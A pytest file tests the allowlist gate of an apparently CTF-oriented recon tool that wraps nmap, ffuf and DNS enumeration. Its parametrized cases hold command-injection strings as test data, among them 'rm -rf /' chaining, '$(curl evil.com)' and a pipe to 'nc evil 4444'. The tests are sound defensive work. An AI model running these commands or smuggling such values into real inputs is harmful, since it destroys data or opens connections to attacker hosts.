"""
tests/test_safety.py
====================
Tests for the single most security-critical file in the project: the
allowlist gate. If any of these regress, the tool could touch a host the
user never authorized - so this is exactly what CI should guard.

Covers:
  - validate_host_format accepts real IPs/hostnames and rejects garbage,
    including command-injection-flavoured strings.
  - assert_authorized fails CLOSED: unknown host, missing config, malformed
    entries all refuse rather than fall through.
  - the recon wrappers hit the gate BEFORE anything else (ordering matters:
    an unauthorized target must be refused even if the binary is missing).
"""

import sys
from pathlib import Path

import pytest
import yaml

sys.path.insert(0, str(Path(__file__).parent.parent))

import safety  # noqa: E402
from tools import recon  # noqa: E402


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def write_allowlist(tmp_path, entries):
    cfg = tmp_path / "targets.yaml"
    cfg.write_text(yaml.safe_dump({"authorized_targets": entries}))
    return cfg


@pytest.fixture
def point_config(tmp_path, monkeypatch):
    """Point safety.CONFIG_PATH at a temp allowlist we control."""
    def _set(entries):
        cfg = write_allowlist(tmp_path, entries)
        monkeypatch.setattr(safety, "CONFIG_PATH", cfg)
        return cfg
    return _set


# --------------------------------------------------------------------------- #
# validate_host_format
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "host",
    ["10.10.11.123", "192.168.1.1", "127.0.0.1", "::1", "fe80::1", "example.htb", "box.thm", "a.b.c.d.example.com"],
)
def test_validate_accepts_valid_hosts(host):
    assert safety.validate_host_format(host) == host


@pytest.mark.parametrize(
    "host",
    [
        "10.10.11.123; rm -rf /",     # command chaining
        "10.10.11.123 && whoami",     # command chaining
        "$(curl evil.com)",           # command substitution
        "`id`",                       # backtick substitution
        "10.10.11.123|nc evil 4444",  # pipe
        "host name with spaces",
        "-target",                    # leading dash / flag injection
        "",                           # empty
        "10.10.11.123/../../etc",     # path traversal chars
        "10.10.11.123\nnewline",      # embedded newline
    ],
)
def test_validate_rejects_garbage_and_injection(host):
    with pytest.raises(safety.NotAuthorizedError):
        safety.validate_host_format(host)


def test_all_numeric_dotted_is_treated_as_hostname_not_ip():
    # "999.999.999.999" is not a valid IP but IS a syntactically valid
    # (all-numeric) hostname, so it's accepted at the format layer. This is
    # harmless: it can't inject, can't resolve to anything useful, and still
    # has to appear in the allowlist to authorize anything. Documented here
    # so the behaviour is intentional, not an accident.
    assert safety.validate_host_format("999.999.999.999") == "999.999.999.999"


# --------------------------------------------------------------------------- #
# assert_authorized - fail closed
# --------------------------------------------------------------------------- #
def test_authorized_host_passes(point_config):
    point_config([{"host": "10.10.11.5", "platform": "htb", "note": "test box"}])
    meta = safety.assert_authorized("10.10.11.5")
    assert meta["platform"] == "htb"
    assert meta["note"] == "test box"


def test_unauthorized_host_refused(point_config):
    point_config([{"host": "10.10.11.5", "platform": "htb", "note": "ok"}])
    with pytest.raises(safety.NotAuthorizedError):
        safety.assert_authorized("10.10.11.6")


def test_empty_allowlist_refuses_everything(point_config):
    point_config([])
    with pytest.raises(safety.NotAuthorizedError):
        safety.assert_authorized("10.10.11.5")


def test_missing_config_refuses(tmp_path, monkeypatch):
    monkeypatch.setattr(safety, "CONFIG_PATH", tmp_path / "does_not_exist.yaml")
    with pytest.raises(safety.NotAuthorizedError):
        safety.assert_authorized("10.10.11.5")


def test_bad_platform_entry_is_skipped(point_config):
    # An entry with an invalid platform must NOT become authorized.
    point_config([{"host": "10.10.11.5", "platform": "production", "note": "nope"}])
    with pytest.raises(safety.NotAuthorizedError):
        safety.assert_authorized("10.10.11.5")


def test_entry_without_host_is_ignored(point_config):
    point_config([{"platform": "htb", "note": "no host key"}])
    with pytest.raises(safety.NotAuthorizedError):
        safety.assert_authorized("10.10.11.5")


def test_all_valid_platforms_accepted(point_config):
    for plat in ("htb", "thm", "homelab"):
        point_config([{"host": "10.0.0.9", "platform": plat, "note": "x"}])
        assert safety.assert_authorized("10.0.0.9")["platform"] == plat


def test_injection_host_refused_even_if_in_config(point_config):
    # Even if someone hand-edits a malicious value into the YAML, the format
    # validation in assert_authorized rejects it before any lookup.
    point_config([{"host": "10.10.11.5; id", "platform": "htb", "note": "x"}])
    with pytest.raises(safety.NotAuthorizedError):
        safety.assert_authorized("10.10.11.5; id")


# --------------------------------------------------------------------------- #
# gate ordering in the recon wrappers
# --------------------------------------------------------------------------- #
def test_recon_refuses_unauthorized_before_touching_binary(point_config):
    # Unauthorized target must raise from the gate, not from a missing-binary
    # check - i.e. authorization is the very first thing that happens.
    point_config([])  # nothing authorized
    with pytest.raises(safety.NotAuthorizedError):
        recon.run_nmap("10.10.11.5")
    with pytest.raises(safety.NotAuthorizedError):
        recon.run_ffuf("10.10.11.5", mode="dir")
    with pytest.raises(safety.NotAuthorizedError):
        recon.run_dns_enum("10.10.11.5", domain="example.htb")
